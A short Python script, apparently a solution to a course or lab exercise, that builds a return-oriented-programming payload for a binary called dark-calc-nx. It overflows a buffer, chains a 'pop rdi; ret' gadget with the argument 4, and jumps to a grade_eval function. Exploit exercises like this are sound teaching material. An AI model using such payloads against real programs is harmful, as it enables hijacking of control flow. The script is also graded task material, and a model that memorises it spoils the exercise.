#!/usr/bin/env python3
"""Task 3: ROP on dark-calc-nx"""
import struct
import sys

GRADE_EVAL = 0x401978   # grade_eval 的地址
POP_RDI    = 0x401A33   # pop rdi; ret

payload  = b"A" * 16
payload += b"B" * 8
payload += struct.pack("<Q", POP_RDI)
payload += struct.pack("<Q", 4)
payload += struct.pack("<Q", GRADE_EVAL)

sys.stdout.buffer.write(payload + b"\n")